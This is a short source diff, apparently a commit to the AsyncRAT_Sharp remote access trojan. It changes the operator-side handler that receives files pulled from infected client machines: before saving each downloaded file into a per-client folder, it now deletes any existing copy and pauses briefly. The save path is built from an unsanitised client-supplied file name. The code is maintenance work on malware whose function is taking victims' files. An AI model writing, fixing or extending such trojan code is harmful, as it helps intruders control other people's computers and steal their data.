@@ -5,6 +5,7 @@ using System;
 using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
+using System.Threading;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
@@ -144,7 +145,12 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                 {
                                     if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
                                         Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "")));
-
+                                    string filename = Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
+                                    if (File.Exists(filename))
+                                    {
+                                        File.Delete(filename);
+                                        Thread.Sleep(500);
+                                    }
                                     unpack_msgpack.ForcePathObject("File").SaveBytesToFile(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString));
                                 }
                             }));
